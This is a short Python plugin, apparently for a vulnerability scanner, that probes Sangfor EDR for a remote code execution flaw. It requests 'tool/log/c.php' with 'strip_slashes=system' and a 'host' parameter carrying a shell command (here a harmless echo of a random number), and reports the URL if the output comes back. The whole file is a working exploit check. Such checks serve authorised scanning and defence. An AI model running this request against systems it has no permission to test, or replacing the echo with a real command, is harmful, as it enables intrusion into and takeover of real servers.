#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import random
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    Sangfor_EDR_RCE
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
            }
            random_str = str(random.randint(100000, 999999))
            async with ClientSession() as session:
                url = self.base_url + "tool/log/c.php?strip_slashes=system&host=echo " + random_str
                async with session.get(url=url, headers=headers) as res:
                    if res!=None:
                        text = await res.text()
                        if int(res.status) == 200 and 'Log Helper' in text and random_str in text:
                            yield url